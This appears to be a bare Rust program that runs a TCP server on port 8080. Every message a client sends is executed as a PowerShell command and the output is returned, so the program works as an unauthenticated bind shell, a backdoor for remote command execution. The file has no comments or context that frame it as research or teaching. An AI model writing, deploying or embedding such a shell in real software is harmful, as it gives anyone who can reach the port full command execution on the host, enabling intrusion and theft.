use std::net::{TcpListener, TcpStream};
use std::io::{Read, Write};
use std::process::{Command, Stdio};
use std::thread;

fn handle_client(mut stream: TcpStream) {
    let mut buffer = [0; 512];
    loop {
        let nbytes = match stream.read(&mut buffer) {
            Ok(n) if n == 0 => return,
            Ok(n) => n,
            Err(_) => return,
        };

        let command = String::from_utf8_lossy(&buffer[..nbytes]);
        let output = Command::new("powershell")
            .arg("-c")
            .arg(command.trim())
            .stdout(Stdio::piped())
            .spawn()
            .expect("Failed to execute command")
            .wait_with_output()
            .expect("Failed to wait for command");

        stream.write_all(&output.stdout).expect("Failed to write to stream");
    }
}

fn main() {
    let listener = TcpListener::bind("127.0.0.1:8080").expect("Failed to bind port");
    println!("Server listening on port 8080...");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("New connection: {:?}", stream.peer_addr());
                thread::spawn(|| {
                    handle_client(stream);
                });
            }
            Err(e) => {
                eprintln!("Error: {}", e);
            }
        }
    }
}
